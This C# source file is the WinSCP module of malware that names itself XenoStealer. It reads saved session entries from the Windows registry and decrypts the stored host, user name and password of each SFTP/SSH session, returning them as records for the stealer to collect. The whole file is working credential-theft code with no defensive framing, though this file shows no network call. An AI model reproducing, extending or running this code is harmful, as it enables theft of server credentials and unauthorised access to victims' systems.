using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class WinScp
    {
        public static DataExtractionStructs.WinScpInfo[] GetInfo() 
        {
            object hasMasterPassword=Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security", "UseMasterPassword");
            if (hasMasterPassword == null || hasMasterPassword.GetType() != typeof(int) || (int)hasMasterPassword == 1) 
            {
                return null;
            }
            List<DataExtractionStructs.WinScpInfo> winScpInfos = new List<DataExtractionStructs.WinScpInfo>();

            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        string path = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(path))
                        {
                            foreach (string key in OpenedKey.GetSubKeyNames())
                            {
                                try
                                {
                                    using (RegistryKey dataKey = OpenedKey.OpenSubKey(key))
                                    {
                                        string HostName = (string)dataKey.GetValue("HostName");
                                        if (HostName == null)
                                        {
                                            HostName = "";
                                        }
                                        string UserName = (string)dataKey.GetValue("UserName");
                                        if (UserName == null)
                                        {
                                            UserName = "";
                                        }
                                        string Password = (string)dataKey.GetValue("Password");
                                        if (Password == null)
                                        {
                                            Password = "";
                                        }
                                        int PortNumber = 22;
                                        object Portdata = dataKey.GetValue("PortNumber");
                                        if (Portdata != null)
                                        {
                                            PortNumber = (int)Portdata;
                                        }
                                        if (!string.IsNullOrEmpty(Password))
                                        {
                                            Password = DecryptData(Password);
                                            Password = Password.Substring(HostName.Length + UserName.Length);
                                        }
                                        if (string.IsNullOrEmpty(HostName) && string.IsNullOrEmpty(UserName) && string.IsNullOrEmpty(Password))
                                        {
                                            continue;
                                        }

                                        winScpInfos.Add(new DataExtractionStructs.WinScpInfo(HostName, PortNumber, UserName, Password));
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                }
                catch
                {

                }
                if (winScpInfos.Count > 0)
                {
                    break;
                }
            }

            return winScpInfos.ToArray();
        }

        private static int DecryptNextChar(List<string> list)
        {
            int result = 0xff ^ (((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 0xa3) & 0xff);
            list.RemoveRange(0, 2);
            return result;
        }

        private static string DecryptData(string EncryptedData)//took this from a previous project, i dont like the varible names, but im losing my interest in this project, so i wanna finish it as fast as i can before i completely put it away.
        {
            List<string> Stage1Password = new List<string>();
            for (int i = 0; i < EncryptedData.Length; i++)
            {
                if (EncryptedData[i] == 'A')
                {
                    Stage1Password.Add("10");
                }
                else if (EncryptedData[i] == 'B')
                {
                    Stage1Password.Add("11");
                }
                else if (EncryptedData[i] == 'C')
                {
                    Stage1Password.Add("12");
                }
                else if (EncryptedData[i] == 'D')
                {
                    Stage1Password.Add("13");
                }
                else if (EncryptedData[i] == 'E')
                {
                    Stage1Password.Add("14");
                }
                else if (EncryptedData[i] == 'F')
                {
                    Stage1Password.Add("15");
                }
                else
                {
                    Stage1Password.Add(EncryptedData[i].ToString());
                }
            }
            if (Stage1Password.Count < 2)
            {
                return null;
            }
            int dataLength;
            int flag = DecryptNextChar(Stage1Password);
            if (flag == 0xff)
            {
                if (Stage1Password.Count < 2)
                {
                    return null;
                }
                DecryptNextChar(Stage1Password);//skip this char.
                if (Stage1Password.Count < 2)
                {
                    return null;
                }
                dataLength = DecryptNextChar(Stage1Password);
            }
            else
            {
                dataLength = flag;
            }
            if (Stage1Password.Count < 2)
            {
                return null;
            }
            int GarbageLength = DecryptNextChar(Stage1Password) * 2;

            if (GarbageLength > Stage1Password.Count) 
            {
                return null;
            }

            Stage1Password.RemoveRange(0, GarbageLength);

            string result = "";
            for (int i = 0; i < dataLength; i++)
            {
                if (Stage1Password.Count < 2)
                {
                    return null;
                }
                result += (char)DecryptNextChar(Stage1Password);
            }
            return result;
        }
    }
}
